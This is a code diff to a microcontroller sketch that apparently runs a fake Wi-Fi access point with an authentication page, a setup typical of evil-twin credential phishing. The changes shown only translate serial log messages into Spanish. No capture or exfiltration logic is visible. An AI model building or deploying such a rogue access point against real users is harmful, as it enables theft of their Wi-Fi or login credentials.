@@ -16,13 +16,14 @@ IPAddress* apip = new IPAddress(192,168,1,1);
 FakeAP* accessPoint = new FakeAP(80);
 int printed = 0;
 
+
 void setup()
 {
   Serial.begin(115200);
   Serial.setDebugOutput(true);
   delay(2000);
 
-  Serial.println("Loading....");
+  Serial.println("Cargando....");
   delay(1000);
   
   accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
@@ -33,8 +34,8 @@ void setup()
   if (!accessPoint->initialize(SSID, "", WIFI_SSID, WIFI_PSW))
     Serial.println("Error en la configuración del punto de acceso");
 
-  Serial.println("Config done!");
-  
+  Serial.println("Configuración acabada!");
+
 }
 
 void loop()
@@ -43,7 +44,7 @@ void loop()
 
   if (printed<=0){
     Serial.printf("server ip: %s\n", accessPoint->getServerIp().toString().c_str());
-    Serial.println("wainting for client to connect");
+    Serial.println("En espera de clientes....");
     printed++;
   }
 
